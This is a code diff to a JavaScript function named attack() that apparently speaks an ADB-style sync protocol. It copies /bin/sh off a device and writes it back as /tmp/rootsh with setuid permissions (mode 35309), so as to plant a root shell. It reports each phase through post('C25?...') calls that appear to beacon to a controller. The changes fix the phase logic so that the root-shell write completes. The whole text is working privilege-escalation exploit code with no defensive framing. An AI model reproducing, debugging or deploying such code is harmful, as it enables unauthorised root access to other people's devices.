@@ -87,7 +87,6 @@ function attack() {
     function go() {
         phase++;
         post('C25?phase=' + phase);
-        phaseOKAYs = 0;
         if (phase === 1) { recvBuf = new Buffer(0); syncMsg('RECV', '/bin/sh'); }
         else if (phase === 2) { syncMsg('SEND', '/tmp/rootsh,35309'); }
         else finish('done');
@@ -106,7 +105,7 @@ function attack() {
                 }
                 doneMsg();
                 post('C25?rootsh_queued=' + shBytes.length);
-            } else if (phaseOKAYs > 1) {
+            } else {
                 post('C25?ROOTSH_WRITTEN');
                 finish('rootsh_written');
             }
@@ -121,10 +120,16 @@ function attack() {
             var data = inner.slice(8, 8 + slen);
             inner = inner.slice(8 + slen);
             if (sc === 'OKAY') { onOKAY(); }
-            else if (sc === 'DATA' && phase === 2) { recvBuf = Buffer.concat([recvBuf, data]); }
+            else if (sc === 'DATA' && phase === 1) { recvBuf = Buffer.concat([recvBuf, data]); }
             else if (sc === 'DONE') {
                 post('C25?DONE[phase ' + phase + ']');
-                if (phase === 2) { shBytes = recvBuf; post('C25?sh_size=' + shBytes.length); go(); }
+                if (phase === 1) {
+                    shBytes = recvBuf;
+                    post('C25?sh_size=' + shBytes.length);
+                    writeBusy = false;
+                    pump();
+                    go();
+                }
             } else if (sc === 'FAIL') {
                 post('C25?FAIL[' + phase + ']=' + data.toString('ascii', 0, 150));
                 finish('fail');
